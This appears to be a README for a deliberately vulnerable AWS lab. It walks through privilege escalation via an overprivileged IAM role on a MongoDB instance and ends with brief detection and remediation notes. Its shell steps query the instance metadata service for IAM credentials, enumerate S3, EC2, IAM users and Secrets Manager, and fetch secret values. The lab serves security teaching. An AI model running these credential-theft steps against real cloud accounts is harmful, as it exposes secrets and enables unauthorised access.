# Privilege Escalation Demo

Step-by-step demonstration of escalating privileges via overprivileged IAM.

## Overview

This demo shows how an attacker can abuse the MongoDB instance's overprivileged IAM role.

## Quick Demo

```bash
make demo-iam
```

## Manual Steps

### 1. Access MongoDB Instance

```bash
make ssh-mongodb
```

### 2. Verify Instance Role

```bash
aws sts get-caller-identity
```

### 3. Query IMDS (WIZ-007)

```bash
# Get role name
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/mongodb-role
```

### 4. Enumerate AWS (WIZ-002)

With the instance role, enumerate AWS:

```bash
# List S3 buckets
aws s3 ls

# Enumerate EC2
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress]'

# List IAM users
aws iam list-users

# List secrets
aws secretsmanager list-secrets
```

### 5. Access Secrets

```bash
# Get a secret value
aws secretsmanager get-secret-value --secret-id <secret-name>
```

## Detection

- GuardDuty: Unusual API activity
- CloudTrail: API calls from instance role

## Remediation

Apply least privilege. See [WIZ-002](../security/iam-overprivileged.md).
